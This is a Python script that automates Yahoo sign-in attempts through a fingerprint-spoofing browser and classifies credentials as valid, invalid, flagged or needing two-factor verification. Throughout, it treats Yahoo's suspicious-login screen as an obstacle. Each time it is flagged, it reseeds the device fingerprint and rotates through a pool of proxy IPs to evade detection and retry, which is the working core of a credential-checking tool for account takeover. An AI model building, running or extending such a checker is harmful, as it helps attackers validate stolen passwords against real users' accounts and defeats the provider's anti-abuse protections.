#!/usr/bin/env python3
"""Attempt Yahoo login with organic fingerprint + same-country SOCKS5 proxy.

Key behavior: Yahoo's "something went wrong / try again from a different device"
(/account/challenge/fail) is a DEVICE/IP flag, not necessarily a wrong password.
When we hit it, we reseed the profile fingerprint (new device identity) and
rotate the proxy IP, then retry. We improve organicness by enabling humanize.

Usage:
    python3 check_yahoo_organic.py --user u@yahoo.com --pass PW --profile organic-us-nyc
"""

from __future__ import annotations
import argparse, json, os, re, subprocess, sys, time, urllib.request

os.environ.setdefault("CBPM_API_URL", "https://clk.mrme.tech")
os.environ.setdefault("CBPM_API_TOKEN", "change-me-to-a-secure-token")

LOGIN_URL = "https://login.yahoo.com/?lang=en-US"
FLAG_MARKERS = ("could not sign you in", "something went wrong", "try again from a different device",
                "we could not sign you in", "challenge/fail")
# US proxy rotation pool (IPVanish SOCKS5) so we can change IP on flag
US_PROXIES = [
    "8c5d74a2-907c-4701-9178-df9d992a51ba",  # us-nyc
    "7db0b35b-283c-4e91-a46f-413886bda259",  # us-sjc
    "cdfc5241-3a02-48d2-8052-fef1ac3d416e",  # us-lax
    "8ac65e73-0c7a-4f9a-82ce-ca6ecf5eeca9",  # us-iad
    "9256e0eb-71b6-4ca3-bf88-f37267e7df1a",  # us-chi
    "f4b1c32e-daac-46ec-ac41-6cde87411626",  # us-dal
]


def run(cmd):
    p = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (p.stdout + p.stderr).strip()


def domeval(expr):
    out = run(f"bdg dom eval '{expr}' 2>/dev/null")
    if out.startswith("(node:"):
        out = out[out.find("\\n") + 1:]
    return out


def click_next():
    return domeval("""(() => { const b = Array.from(document.querySelectorAll('button')).find(x => /^next$/i.test((x.textContent||'').trim()) && x.offsetParent!==null); if(b){b.click(); return 'ok';} return 'none'; })()""").strip() == "ok"


def fill_field(sel, val):
    expr = ("(() => { const el = document.querySelector('%s'); if(!el) return 'no'; "
            "const s = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set; "
            "el.focus(); s.call(el, %s); el.dispatchEvent(new Event('input',{bubbles:true})); "
            "el.dispatchEvent(new Event('change',{bubbles:true})); el.blur(); return el.value; })()")
    run(f"bdg dom eval \"{expr % (sel, json.dumps(val))}\"")


def current_signals():
    out = run('bdg dom eval "(() => ({u:location.href, b:document.body?document.body.innerText.slice(0,800):''}))()" 2>/dev/null')
    try:
        return json.loads(out)
    except Exception:
        return {"u": "", "b": ""}


def rotate_device(profile, proxy_idx):
    """Reseed fingerprint + switch proxy IP for a fresh device identity."""
    run(f"bdg cloak profile reseed {profile}")
    run(f"bdg cloak profile proxy {profile} --credential {US_PROXIES[proxy_idx % len(US_PROXIES)]}")
    run(f"bdg cloak stop {profile}")
    time.sleep(3)
    run(f"bdg cloak launch {profile}")
    time.sleep(8)
    run(f"bdg cloak connect {profile} about:blank")
    time.sleep(4)


def attempt_login(profile, username, password, timeout=45):
    run("bdg cdp Network.clearBrowserCookies")
    run('bdg cdp Page.navigate --params \'{"url":"%s"}\'' % LOGIN_URL)
    # wait for username
    dl = time.time() + timeout
    while time.time() < dl:
        if domeval("(() => {const e=document.querySelector('#username'); return e&&e.offsetParent!==null?'y':'n';})()").strip() == "y":
            break
        time.sleep(1)
    fill_field("#username", username)
    time.sleep(2)
    click_next()
    time.sleep(8)
    # wait for password
    pw_ready = False
    dl = time.time() + timeout
    while time.time() < dl:
        if domeval("(() => {const e=document.querySelector('#login-passwd'); return e&&e.offsetParent!==null?'y':'n';})()").strip() == "y":
            pw_ready = True
            break
        time.sleep(1)
    if not pw_ready:
        s = current_signals()
        return classify(s)
    fill_field("#login-passwd", password)
    time.sleep(2)
    click_next()
    # wait for resolution
    time.sleep(12)
    s = current_signals()
    return classify(s)


def classify(s):
    url = (s.get("u") or "").lower()
    body = (s.get("b") or "").lower()
    if any(m in url for m in ("mail.yahoo.com", "www.yahoo.com")) and "challenge" not in url:
        return "valid"
    if "/challenge/fail" in url or any(m in body for m in FLAG_MARKERS):
        return "flagged"   # device/IP flag -> rotate
    if "/challenge-selector" in url or "verification" in body or "select a verification" in body:
        return "needs_2fa"
    return "invalid"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--user", required=True)
    ap.add_argument("--pass", dest="password", required=True)
    ap.add_argument("--profile", default="organic-us-nyc")
    ap.add_argument("--max-retries", type=int, default=4)
    args = ap.parse_args()

    run(f"bdg cloak connect {args.profile} about:blank")
    time.sleep(4)

    for attempt in range(1, args.max_retries + 1):
        print(f"[attempt {attempt}/{args.max_retries}] {args.user} ...", flush=True)
        status = attempt_login(args.profile, args.user, args.password)
        if status == "flagged":
            print("    -> FLAGGED (device/IP). Rotating fingerprint + proxy IP...", flush=True)
            rotate_device(args.profile, attempt - 1)
            continue
        print(f"    -> {status}")
        return 0 if status in ("valid", "needs_2fa") else 1

    print("Exhausted retries (all flagged).")
    return 1


if __name__ == "__main__":
    sys.exit(main())
